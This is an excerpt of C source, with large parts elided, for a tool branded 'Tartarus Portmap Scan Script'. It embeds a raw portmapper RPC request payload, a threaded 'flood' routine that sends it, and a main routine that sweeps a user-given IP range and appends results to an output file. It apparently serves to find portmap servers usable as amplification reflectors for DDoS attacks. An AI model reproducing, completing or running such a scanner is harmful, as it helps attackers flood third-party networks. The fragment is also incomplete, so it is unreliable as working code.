...
FILE *fd;
char payload[] =
"\x65\x72\x0a\x37\x00\x00\x00\x00\x00\x00\x00\x02\x00\x01\x86\xa0\x00\x00\x00\x02\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
...
void *flood(void *par1)
{
    ...
    memcpy(buf, "\x65\x72\x0a\x37\x00\x00\x00\x00\x00\x00\x00\x02\x00\x01\x86\xa0\x00\x00\x00\x02\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 50);
    int sizeofpayload = 50;
    int sock;
...
int main(int argc, char *argv[ ])
{
    ...
    if(argc < 6){
                fprintf(stderr, "\\e[38;5;93m[\e[38;5;202mTartarus\e[38;5;93m] \e[38;5;202mPortmap Scan Script\n");
                fprintf(stdout, "\e[38;5;93m[\e[38;5;202mTartarus\e[38;5;93m] \e[38;5;202mInvalid Input:\x1b[1;34m %s \x1b[0;34mRange Start 198.0.0.1 \x1b[1;33mEnd Range 192.168.255.255 \x1b[0;36mOUTPUT \x1b[0;31mThreads \x1b[1;35m MS Delay\n", argv[0]);
        exit(-1);
    }
    fd = fopen(argv[3], "a");
    ...
    sleep(1);
    printf("\e[38;5;93m[\e[38;5;202mTartarus\e[38;5;93m] \e[38;5;202mPortmap Scan Script.\n");
